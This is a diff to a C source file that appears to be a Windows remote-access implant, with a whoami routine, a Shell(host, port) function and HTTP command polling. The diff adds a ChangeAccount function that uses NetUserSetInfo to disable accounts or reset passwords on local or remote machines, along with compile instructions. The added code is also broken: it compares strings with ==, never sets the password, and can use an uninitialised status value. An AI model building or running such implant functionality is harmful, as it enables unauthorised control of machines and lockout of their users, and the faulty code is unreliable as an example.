@@ -9,6 +9,8 @@
 
 */
 
+// Compile : gcc .\HttpSendRequest.c -o .\HttpSendRequest.exe -lws2_32 -luser32 -lwininet -lnetapi32 -s
+
 
 
 #include<stdio.h>	// printf, scanf
@@ -16,7 +18,9 @@
 #include<Windows.h>
 #include<ws2tcpip.h>
 #include<strsafe.h>	// StringCchLength, StringCchCopy, StringCchCat 
+#include<lm.h>		//netusersetinfo
 #pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "netapi32.lib")
 #define BUFFER_SIZE 1000
 
 void whoami() {
@@ -157,6 +161,41 @@ int Shell(char* host, int port){
 }
 
 
+void ChangeAccount(char* cmd, char* UserName, char* ServerName){
+
+	if(ServerName == "localhost" || ServerName == "" || ServerName == "127.0.0.1"){
+		ServerName = NULL;
+	}
+
+	DWORD dwlevel;
+	NET_API_STATUS nStatus;
+	
+	if(cmd == "DisableAccount"){
+		dwlevel = 1008;
+		USER_INFO_1008 ui;
+		ui.usri1008_flags = UF_SCRIPT | UF_ACCOUNTDISABLE;
+		nStatus = NetUserSetInfo(ServerName, UserName, dwlevel, (LPBYTE)&ui, NULL);
+	}
+	else if(cmd == "ChangePassword"){
+		dwlevel = 1003;
+		USER_INFO_1003 ui;
+		ui.usri1003_password;
+		nStatus = NetUserSetInfo(ServerName, UserName, dwlevel, (LPBYTE)&ui, NULL);
+	}
+	else{
+		USER_INFO_1008 ui;
+	}
+	// add rest of them here
+
+	if(nStatus == NERR_Success){
+        fwprintf(stderr,L"User account %s has been updated\n", UserName);
+    }
+    else{
+        fprintf(stderr, "A system error has occurred: %d\n", nStatus);
+    }
+
+}
+
 
 void HTTPconnections() {
 
@@ -211,14 +250,10 @@ void HTTPconnections() {
 			else {
 				printf("%s\n\n\n\n", RecvBuff);
 			}
-
-
 		}
-
 	}
-
-
 }
+
 
 
 int main(int argc, char** argv) {
